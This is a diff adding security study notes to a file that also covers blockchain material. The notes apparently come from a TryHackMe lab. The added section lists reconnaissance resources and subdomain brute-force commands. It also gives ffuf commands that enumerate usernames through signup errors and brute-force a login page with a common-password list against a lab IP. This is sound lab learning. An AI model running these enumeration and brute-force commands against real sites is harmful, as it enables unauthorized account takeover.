@@ -477,6 +477,28 @@ Screenshots are taken from [Detailed Info about Block 614926. BitcoinChain.com](
  - [Miner fees - Bitcoin Wiki](https://en.bitcoin.it/wiki/Miner_fees)
  - [Structure of a Block in Blockchain - Naukri Learning](https://www.naukri.com/learning/articles/structure-of-a-block-in-blockchain/)
 
+### Usefull links
+
+- https://github.com/danielmiessler/SecLists - collection of different lists for security assesments
+- https://archive.org/ - archive
+- https://www.wappalyzer.com/ tool for checking 
+- https://wiki.owasp.org/index.php/OWASP_favicon_database - favicon database
+- https://ui.ctsearch.entrust.com/ui/ctsearchui - certificates database
+- https://crt.sh/ - certificates database
+
+### Useful tools
+- dnsrecon -t brt -d acmeitsupport.thm - bruteforce subdomain search
+- ./sublist3r.py -d acmeitsupport.thm, https://github.com/aboul3la/Sublist3r - bruteforce subdomain search
+
+### Checks
+- Try to input username, check if error returns "User with this username already exists" or "password is invelid for this username"
+
+``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.87.232/customers/signup -mr "username already exists"
+
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.87.232/customers/login -fc 200
+```
+
+
 
 
 
